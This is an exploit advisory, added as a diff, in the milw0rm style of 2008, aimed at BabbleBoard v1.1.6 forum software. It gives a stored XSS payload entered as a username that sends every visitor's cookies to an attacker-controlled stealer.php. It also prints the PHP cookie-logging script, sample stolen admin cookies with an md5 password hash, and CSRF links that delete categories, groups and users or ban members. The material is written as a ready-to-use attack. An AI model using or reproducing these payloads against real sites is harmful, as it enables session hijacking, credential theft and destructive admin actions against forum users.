@@ -1,0 +1,79 @@
+############################################################################################
+[+] BabbleBoard v1.1.6 Cookie Grabber Exploit/CSRF
+[+] Discovered By SirGod
+[+] Greetz : All my friends
+############################################################################################
+
+[+] Cookie Grabber Exploit
+
+  - Steal the cookie of any visitor.
+
+1.Register as :
+
+<script>document.location
+="http://[yourdomain]/[path]/stealer.php?cookie=" +
+document.cookie;</script>
+
+Everyone who visit the index page will be redirected on your cookie
+grabber. (because you will be the Latest Member)
+
+Be sure that you use " and not ' because is forbbiden to use that char
+is your username.
+
+2 . In stealer.php use the following code (simple cookie grabber)
+
+<?php
+$cookie = $_GET['cookie'];
+$log = fopen("log.txt", "a");
+fwrite($log, $cookie ."\n");
+fclose($log);
+?>
+
+Make sure that you have in the stealer.php directory a file log.txt .
+For stealed cookies check log.txt .
+
+3 . You will grab every visitor cookie .
+
+Example (cookie) of a not logged in user :
+
+PHPSESSID=gtolfce6jppb4oasfm81efrqf6
+
+Example (cookie) of a logged in user (admin) :
+
+bb_name=admin; bb_password=d73ed8a01f624fcb878296bc7ff302bc;
+PHPSESSID=gtolfce6jppb4oasfm81efrqf6
+
+Username is bb_name.Password is bb_password and is hashed as md5.
+
+[+] Cross Site Request Forgery
+
+If a logged in user with administrative permissions click one of the
+following links the specified action will be executed.
+
+- Delete category
+
+http://127.0.0.1/[path]index.php?page=admin&act=categories&func=delete&id=[CatID]
+
+http://127.0.0.1/[path]index.php?page=admin&act=categories&func=delete&id=5
+
+- Delete group
+
+http://127.0.0.1/[path]index.php?page=admin&act=groups&func=delete&id=[GroupID]
+
+http://127.0.0.1/[path]index.php?page=admin&act=groups&func=delete&id=2
+
+- Ban User
+
+http://127.0.0.1/[path]index.php?page=admin&act=members&func=ban&id=[UserID]
+
+http://127.0.0.1/[path]index.php?page=admin&act=members&func=ban&id=4
+
+- Delete User
+
+http://127.0.0.1/[path]index.php?page=admin&act=members&func=delete&id=[UserID]
+
+http://127.0.0.1/[path]index.php?page=admin&act=members&func=delete&id=4
+
+############################################################################################
+
+# milw0rm.com [2008-12-15]
